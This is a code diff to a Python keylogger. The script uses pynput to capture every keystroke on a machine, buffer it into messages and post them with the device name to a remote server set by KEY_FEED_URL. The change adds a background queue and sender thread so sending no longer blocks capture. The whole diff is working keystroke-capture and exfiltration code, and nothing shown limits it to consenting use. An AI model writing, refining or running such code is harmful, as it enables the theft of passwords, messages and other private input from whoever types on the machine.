@@ -4,13 +4,14 @@ import json
 import hashlib
 import platform
 import socket
-from threading import Lock
+from queue import Queue
+from threading import Lock, Thread
 from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
 
 from pynput.keyboard import Key, KeyCode, Listener
 
-MESSAGE_GAP_MS = 1200
+MESSAGE_GAP_MS = 2500
 SITE_URL = os.getenv("KEY_FEED_URL", "https://your-app.onrender.com").rstrip("/")
 API_KEY = os.getenv("KEY_FEED_API_KEY", "")
 device_name = platform.node() or socket.gethostname() or "Unknown device"
@@ -20,6 +21,7 @@ last_key_time_ms = None
 message_started_ms = None
 active_modifiers = set()
 state_lock = Lock()
+message_queue = Queue()
 
 SHIFTED_SYMBOLS = {
     "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
@@ -69,6 +71,12 @@ def send_message(text):
         print(f"Could not send message: {error}")
 
 
+def message_sender():
+    while True:
+        send_message(message_queue.get())
+        message_queue.task_done()
+
+
 def flush_message_buffer():
     global message_buffer, last_key_time_ms, message_started_ms
     text = message_buffer.strip()
@@ -76,7 +84,7 @@ def flush_message_buffer():
     last_key_time_ms = None
     message_started_ms = None
     if text:
-        send_message(text)
+        message_queue.put(text)
 
 
 def on_press(key):
@@ -117,5 +125,6 @@ def on_release(key):
 
 
 print(f"Sending to {SITE_URL}")
+Thread(target=message_sender, daemon=True).start()
 with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
     keyboard_listener.join()
